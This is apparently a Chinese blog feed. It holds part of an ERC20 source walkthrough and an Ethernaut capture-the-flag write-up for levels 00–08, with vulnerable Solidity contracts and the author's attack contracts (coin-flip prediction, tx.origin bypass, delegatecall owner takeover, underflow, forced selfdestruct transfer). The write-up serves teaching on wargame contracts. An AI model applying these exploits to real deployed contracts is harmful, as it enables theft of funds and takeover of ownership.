&#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[to] += value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代币转移的核心代码，内部函数。第一个 if 中判断<code>from</code>是否为空地址，是则凭空产生代币，另一个内部函数<code>_mint</code>会这样调用它。else 中是既不产生代币也不销毁代币的正常转账，判断<code>fromBalance</code>足够即可转账。第二个 if 中判断<code>to</code>是否为空地址，是则销毁代币，另一个内部函数<code>_burn</code>会这样调用它。执行完代币转移的操作后，触发一个 Transfer 事件。</p>
<h4 id="mint"><a href="#mint" class="headerlink" title="_mint"></a>_mint</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(address(0), account, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>内部函数，用于凭空在一个账户的余额中生成代币，传入的账户为空地址则 revert，否则直接去调用<code>_update</code>。</p>
<h4 id="burn"><a href="#burn" class="headerlink" title="_burn"></a>_burn</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(account, address(0), value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>内部函数，用于销毁一个账户中的代币余额，传入的账户地址为空地址则 revert，否则直接去调用<code>_update</code>。</p>
<h4 id="approve-1"><a href="#approve-1" class="headerlink" title="_approve"></a>_approve</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">    _approve(owner, spender, value, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">    if (owner == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidApprover(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (spender == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSpender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _allowances[owner][spender] = value;</span><br><span class="line">    if (emitEvent) &#123;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>内部函数，用于将<code>owner</code>的一定量代币授权给<code>spender</code>，有两种用法，目的是使<code>emitEvent</code>缺省为 true。</p>
<h4 id="spendAllowance"><a href="#spendAllowance" class="headerlink" title="_spendAllowance"></a>_spendAllowance</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        if (currentAllowance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>内部函数，当被授权者使用<code>transferFrom</code>函数，转移其被授权的代币时被调用，用于扣除其相应的授权额度。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethernaut WP _持续更新中。。。</title>
    <url>/2023/10/07/Ethernaut-wp/</url>
    <content><![CDATA[<h2 id="00-Hello-Ethernaut"><a href="#00-Hello-Ethernaut" class="headerlink" title="00 Hello Ethernaut"></a>00 Hello Ethernaut</h2><p>这是引导的关卡，只需要配置好 MetaMask ，支付一些测试币，然后在控制台与合约进行互动，即可过关。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01 Fallback"></a>01 Fallback</h2><p>这是一道白盒题目，源码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>题目要求：</p>
<ul>
<li>获得这个合约的所有权</li>
<li>把它的余额减到0</li>
</ul>
<p>分析源码，成为合约的 owner 有两种方式：</p>
<ol>
<li>通过不停贡献合约，使当前用户贡献值大于 owner</li>
<li>在已有贡献记录的前提下，向合约发送大于零的以太币</li>
</ol>
<p>由于单次贡献的额度被限制到了0.001ETH 以下，所以不可能通过第一种方式成为 owner（要贡献100万次捏）。那么试一下第二种方式：</p>
<p>首先我们把合约跑起来，可以看到 owner 有很高的初始贡献值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090302300.png"
                      alt="image-20230809030209945"
                ></p>
<p>现在我们更换用户，贡献一下看看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306707.png"
                      alt="image-20230809030601235"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306959.png"
                      alt="image-20230809030613402"
                ></p>
<p>奇怪，贡献了很多次，但是贡献值还是0。</p>
<p>去看了看 Remix 的使用，在调用函数时设置好发送的金额即可。（我真傻，真的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105719.png"
                      alt="image-20230809210513962"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105679.png"
                      alt="image-20230809210526529"
                ></p>
<p>我们把自己的贡献值加到2000，这就满足<code>receive()</code>函数里面成为 owner 其中一个条件了。</p>
<p>关于<code>receive()</code>，当合约接收ETH的时候它会被触发。条件有两个，一是<code>msg.data</code>为空，二是<code>receive()</code>存在。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071410829.png"
                      alt="image-20230907141005773"
                ></p>
<p>Remix IDE有个可以向合约发送 CALLDATA 的功能，设置金额后把 CALLDATA 留空然后发送即可，这样就能顺利触发<code>receive()</code>函数。满足成为 owner 的条件，owner 成功变更：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092155107.png"
                      alt="image-20230809215512188"
                ></p>
<p>下一步把合约的余额清空，调用提现用的<code>withdraw()</code>函数即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092156103.png"
                      alt="image-20230809215635248"
                ></p>
<p>Balance 处已经变为0了。</p>
<p>接下来在线上环境打一遍，难点在对于<code>web3-eth</code>包中<code>sendTransaction()</code>函数的<a class="link"   href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#sendtransaction" >使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，还有就是不依赖 Remix 对合约的函数进行调用，一般以太坊交易包含四个字段，分别是 to、from、amout、data ，其中函数调用信息封装在 data 字段中（<code>sendTransaction()</code>中形参叫做 value）。</p>
<p>data 字段的数据是对函数签名字符串进行 keccak256 哈希运算之后，取前四个字节。contribute()attack()</p>
<p>先看看调用 contribute 的操作（图丢了，假装有个图吧。应该有个 data 字段，值为 0xd7bb99ba）：</p>
<p>然后是 receive：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092311131.png"
                      alt="image-20230809231110635"
                ></p>
<p>随后再进行 withdraw 的调用即可过关：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329572.png"
                      alt="image-20230809232951547"
                ></p>
<p>这里需要注意，对于没有用 payable 修饰的方法，其 amout(value) 只能为0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329101.png"
                      alt="image-20230809232920062"
                ></p>
<p>满足过关条件了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092331871.png"
                      alt="image-20230809233126836"
                ></p>
<h2 id="02-Fal1out"><a href="#02-Fal1out" class="headerlink" title="02 Fal1out"></a>02 Fal1out</h2><p>看关卡名字估计是<del>整型溢出</del>吧，源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256; // 应用附加库SafeMath到uint256类型</span><br><span class="line">    mapping(address =&gt; uint256) allocations; // 创建一个地址-&gt;整形的映射</span><br><span class="line">    address payable public owner; // owner的地址变量</span><br><span class="line"></span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        // 合约的构造函数</span><br><span class="line">        owner = msg.sender; // 初始化owner</span><br><span class="line">        allocations[owner] = msg.value; // allocation分配额的意思</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        // 判断是否为owner的函数修改器</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        // 充值用的函数，会调用SafeMath库里面的add()函数</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value); // 将发送的ETH增加到对应的分配额中</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        // 若分配额&gt;0，则将分配额的ETH转给allocator</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocationys() public onlyOwner &#123;</span><br><span class="line">        // 将合约余额全部转给owner</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        // 查询allocator的分配额余额</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>题目要求是成为该合约的 owner，猜测是 SafeMath 库中的<code>add()</code>函数有漏洞（bushi）。</p>
<p>add()：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a, &quot;SafeMath: addition overflow&quot;);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这函数看着也没啥问题啊。。直接试着调用一下构造函数：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121825627.png"
                      alt="image-20230812182550567"
                ></p>
<p>这里的构造函数可以直接调用的原因是，在这个（0.6.x）大版本中构造函数是一个名称与合约名相同的函数，而没有使用关键字等标识修饰。题目中<code>Fal1out()</code>函数与合约名不同，因此不被认为是构造函数，导致该函数被直接调用。</p>
<p>看一眼 owner，好家伙，直接变成我了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121826811.png"
                      alt="image-20230812182637789"
                ></p>
<p>过关。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121827656.png"
                      alt="image-20230812182713614"
                ></p>
<h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>本题代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins; // 连胜数</span><br><span class="line">    uint256 lastHash; // 用于储存上个区块的哈希值</span><br><span class="line">    uint256 FACTOR =</span><br><span class="line">        57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">     //115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0; // 连胜数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1)); // 上一区块哈希</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            // 将上一区块的哈希值与储存的上一个哈希进行比较</span><br><span class="line">            revert(); // 若相等，回滚</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue; // 将本区块哈希储存</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            // 猜对</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 猜错</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是连续猜对结果10次</p>
<p>看样子和随机数的安全性有关，可以自己部署一个镜像合约来进行硬币结果的预测：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract H4cker &#123;</span><br><span class="line">    CoinFlip public myCoinFlip;</span><br><span class="line">    uint256 FACTOR =</span><br><span class="line">        57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _adress) public &#123;</span><br><span class="line">        myCoinFlip = CoinFlip(_adress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        myCoinFlip.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里利用自己构造的攻击脚本去调用目标合约的 flip 函数，经过攻击合约的预测，重复执行10次 hack 函数即可。</p>
<h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是成为该合约的 owner，但是调用 changeOwner 函数这笔交易的发起者不能是当前的消息发送者。</p>
<p>先想到通过构造攻击合约去调用 changeOwner ，因为交易发起者 tx.origin 是调用链最开始的调用者，而 msg.sender 是当前调用的消息发送者。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Telephone public myTelephone;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        myTelephone = Telephone(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        myTelephone.changeOwner(0x42285Fb92421db39b7EddB9E245f4B092bb0e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061646160.png"
                      alt="image-20230906164615093"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061647466.png"
                      alt="image-20230906164727414"
                ></p>
<h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据提示，应该是溢出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071205880.png"
                      alt="image-20230907120509823"
                ></p>
<p>题目初始会给予20代币，那就试试看下溢出，即向一个账户转出21代币</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071220732.png"
                      alt="image-20230907122033703"
                ></p>
<p>挺多，应该是2^256^-1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071222831.png"
                      alt="image-20230907122210795"
                ></p>
<h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的 fallback() 没有用 payable 修饰，所以转账额度只能是0。</p>
<p>这里的难点是理解并利用 delegatecall() 函数，这是一种特殊类型的消息调用，被称为<strong>委托调用</strong>。它和一般的消息调用的区别在于，目标地址的代码将在发起调用的合约的上下文中执行，并且 msg.sender 和 msg.value 不变。例如这题中就是利用委托调用来调用另一个合约中的函数。</p>
<p>那就试试看调用 pwn() 函数吧，直接在前端控制台 sendTransaction：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071441474.png"
                      alt="image-20230907144125428"
                ></p>
<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20230907143851572.png"
                      alt="image-20230907143851572"
                ></p>
<h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure></div>

<p>竟然是猫猫？（惊</p>
<p>目标是使合约的余额大于0，但看起来并没有能接收代币的函数在。</p>
<p>在寻找没有 payable 修饰的方法的情况下如何向该合约转账时，看到了官方文档的一些信息：</p>
<blockquote>
<p>一个没有 payable fallback 函数的合约，可以作为 coinbase transaction （又名 miner block reward ）的接收者或者作为 <code>selfdestruct</code> 的目标来接收以太币。</p>
</blockquote>
<p>看了一下，利用 selfdestruct 是比较实际的，selfdestruct 可以强制向合约转账。</p>
<p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Force force;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        force = Force(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fucntion hack() public &#123;</span><br><span class="line">        address payable addr = payable(address(force));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550611.png"
                      alt="image-20230907155019552"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550282.png"
                      alt="image-20230907155049231"
                ></p>
<h2 id="08-Vault"><a href="#08-Vault" class="headerlink" title="08 Vault"></a>08 Vault</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是让 locked 为 false，这里应该是要读取 private 的 password。</p>
<p>插槽 slot 是 Solidity 中合约的状态变量存储的地方，一个插槽有32字节的空间，存储的规则是从第一个状态变量开始逐项连续存储，第一个状态变量存储在 slot0 中，如果插槽剩余空间可以存下下一个状态变量，那么就在当前插槽继续存储，否则存储到下一插槽。很显然题目中的 bytes32 要放在 slot1 中了。</p>
